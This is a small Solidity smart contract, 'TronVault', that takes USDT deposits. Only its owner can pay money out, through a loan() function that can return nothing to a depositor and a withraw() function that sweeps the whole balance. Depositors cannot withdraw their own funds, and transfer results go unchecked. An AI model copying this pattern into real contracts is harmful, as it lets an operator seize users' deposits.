// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TronVault {
    using SafeMath for uint256;

    address owner;
    IERC20 USDT;
    uint256 public userCount;
    mapping(address => bool) public userLoaned;
    mapping(address => uint256) public balances;

    constructor(address _USDT) public {
        owner = msg.sender;
        USDT = IERC20(_USDT);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function deposit(uint256 amount) public {
        if (balances[msg.sender] == 0) {
            userCount = userCount.add(1);
            if (userLoaned[msg.sender] == true) {
                userLoaned[msg.sender] = false;
            }
        }
        balances[msg.sender] += amount;
        USDT.transferFrom(msg.sender, address(this), amount);
    }

    function loan(address receiver, uint256 price) public onlyOwner {
        require(price <= 3, "Incorrect price");
        uint256 amount = balances[receiver].mul(uint256(10000).sub(price.mul(10000).div(3))).div(10000);
        balances[receiver] = balances[receiver].sub(amount);
        if (userLoaned[receiver] == false) {
            userCount = userCount.sub(1);
            userLoaned[receiver] = true;
        }
        USDT.transfer(receiver, amount);
    }

    function withraw() public onlyOwner {
        require(userCount == 0, "Not returned to all users");
        USDT.transfer(owner, USDT.balanceOf(address(this)));
    }
}